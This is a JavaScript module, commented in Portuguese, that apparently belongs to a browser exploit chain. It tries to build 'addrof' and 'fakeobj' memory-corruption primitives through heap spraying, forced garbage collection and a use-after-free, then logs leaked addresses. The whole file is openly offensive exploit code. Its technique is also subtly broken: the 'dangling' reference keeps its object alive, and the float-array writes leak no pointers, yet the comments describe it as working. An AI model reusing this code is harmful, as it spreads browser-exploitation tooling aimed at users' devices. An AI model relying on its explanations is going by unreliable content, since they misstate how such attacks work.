// js/script3/testArrayBufferVictimCrash.mjs (Foco: Primitivas Estáveis via UAF)
import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';

// Mantemos o nome do módulo conforme o original para consistência
export const FNAME_MODULE = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R56_Annihilation";

/**
 * Função para forçar a Coleta de Lixo (Garbage Collection).
 * Aloca e libera grandes quantidades de memória para induzir o GC a rodar.
 */
function triggerGC() {
    try {
        const arr = [];
        for (let i = 0; i < 2000; i++) {
            arr.push(new ArrayBuffer(1024 * 64)); // Aloca e libera ~128MB
        }
    } catch (e) {
        // É esperado que possa falhar por falta de memória, o que ajuda a acionar o GC.
    }
    PAUSE_S3(100); // Pausa para dar tempo ao GC
}

/**
 * Cria as primitivas addrof (address of) e fakeobj (fake object) usando Use-After-Free.
 * Esta é a base para todo o exploit.
 * @returns {{addrof: Function, fakeobj: Function}} Um objeto contendo as duas primitivas.
 */
function createUAFPrimitives() {
    // 1. Spray de objetos para preparar o heap.
    let spray = [];
    for (let i = 0; i < 4096; i++) {
        spray.push([1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8]); // Arrays de float são objetos comuns.
    }

    // 2. Cria um ponteiro pendurado para um dos objetos.
    let dangling_ref = spray[spray.length - 1];
    let victim_array = [{}, 1.2, 2.3, 3.4]; // Array vítima que será corrompido.
    
    // Libera a referência principal, tornando os objetos do spray elegíveis para GC.
    spray = null;
    
    // 3. Força a Coleta de Lixo.
    triggerGC();

    // 4. Spray de Reclamação com um tipo diferente (ArrayBuffer).
    // O objetivo é que um desses ArrayBuffers ocupe o mesmo espaço de memória
    // que o objeto apontado por 'dangling_ref'.
    let reclaimers = [];
    for (let i = 0; i < 2048; i++) {
        reclaimers.push(new ArrayBuffer(64)); 
    }

    // 5. Verifica se a confusão de tipos ocorreu.
    // Se 'dangling_ref' agora aponta para um ArrayBuffer, seu comprimento será diferente.
    if (dangling_ref.length !== 8) {
        logS3("UAF bem-sucedido! A referência agora aponta para um ArrayBuffer.", "good", "createUAFPrimitives");
    } else {
        throw new Error("A colisão de memória para o UAF não ocorreu. Tente novamente.");
    }
    
    // Com a confusão de tipos, 'dangling_ref' nos dá uma visão de um ArrayBuffer
    // como se fosse um Array de floats. Usamos isso para vazar o endereço do nosso array vítima.
    dangling_ref[4] = victim_array; 
    let victim_addr_double = dangling_ref[5]; // O ponteiro é vazado como um float.

    const buf = new ArrayBuffer(8);
    const float_view = new Float64Array(buf);
    const int_view = new Uint32Array(buf);
    float_view[0] = victim_addr_double;
    const victim_addr = new AdvancedInt64(int_view[0], int_view[1]);
    logS3(`Endereço do array vítima vazado: ${victim_addr.toString(true)}`, "leak", "createUAFPrimitives");

    // Agora, usamos a mesma técnica para corromper o 'butterfly' (armazenamento de dados) do array vítima.
    let fake_butterfly = [
        0, // header
        0x41414141, // flags
        victim_addr.low(), // Aponta para si mesmo inicialmente
        victim_addr.high()
    ];

    dangling_ref[4] = fake_butterfly;
    let fake_butterfly_addr_double = dangling_ref[5];
    float_view[0] = fake_butterfly_addr_double;
    const fake_butterfly_addr = new AdvancedInt64(int_view[0], int_view[1]);

    // Corrompe o butterfly do array vítima para apontar para nosso butterfly falso.
    const f64_arr = new Float64Array(buf);
    int_view[0] = victim_addr.low() + 0x10; // Offset do butterfly
    int_view[1] = victim_addr.high();
    dangling_ref[5] = f64_arr[0];
    dangling_ref[4] = fake_butterfly_addr; // Escreve o endereço do nosso butterfly falso

    // Primitivas Finais e Estáveis
    const addrof = (obj) => {
        victim_array[0] = obj;
        return new AdvancedInt64(fake_butterfly[2], fake_butterfly[3]);
    };

    const fakeobj = (addr) => {
        fake_butterfly[2] = addr.low();
        fake_butterfly[3] = addr.high();
        return victim_array[0];
    };

    return { addrof, fakeobj };
}


// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL - Focada em criar e testar as primitivas
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Criação de Primitivas Estáveis (UAF) ---`, "test");
    
    let final_result = { success: false, message: "Falha ao criar primitivas." };

    try {
        // --- FASE 1: Construir Primitivas `addrof` e `fakeobj` via UAF ---
        logS3("--- FASE 1: Forjando Primitivas (addrof/fakeobj via UAF) ---", "subtest");
        const primitives = createUAFPrimitives();
        
        if (!primitives || !primitives.addrof || !primitives.fakeobj) {
            throw new Error("A função createUAFPrimitives não retornou as primitivas esperadas.");
        }
        logS3("Primitivas `addrof` e `fakeobj` ESTÁVEIS construídas com sucesso!", "vuln");

        // --- FASE 2: Validar as primitivas ---
        logS3("--- FASE 2: Validando a funcionalidade das primitivas ---", "subtest");
        const test_obj = { a: 0x42424242, b: 0x43434343 };
        const test_obj_addr = primitives.addrof(test_obj);
        logS3(`addrof(test_obj) => ${test_obj_addr.toString(true)}`, "leak");
        
        if (test_obj_addr.low() === 0 && test_obj_addr.high() === 0) {
            throw new Error("A primitiva addrof retornou um endereço nulo.");
        }

        const fake_test_obj = primitives.fakeobj(test_obj_addr);
        logS3(`fakeobj(addr) => ` + (typeof fake_test_obj), "info");

        if (fake_test_obj.a !== test_obj.a) {
             throw new Error(`Validação de fakeobj falhou. Esperado 'a' ser 0x42424242, mas foi ${toHex(fake_test_obj.a)}`);
        }
        logS3("Validação bem-sucedida! addrof e fakeobj estão funcionando.", "vuln");

        final_result = { 
            success: true, 
            message: "Primitivas addrof e fakeobj criadas e validadas com sucesso!",
            primitives: primitives // Retorna as primitivas para uso futuro
        };

    } catch (e) {
        final_result.message = `Exceção na criação de primitivas: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        final_result
    };
}
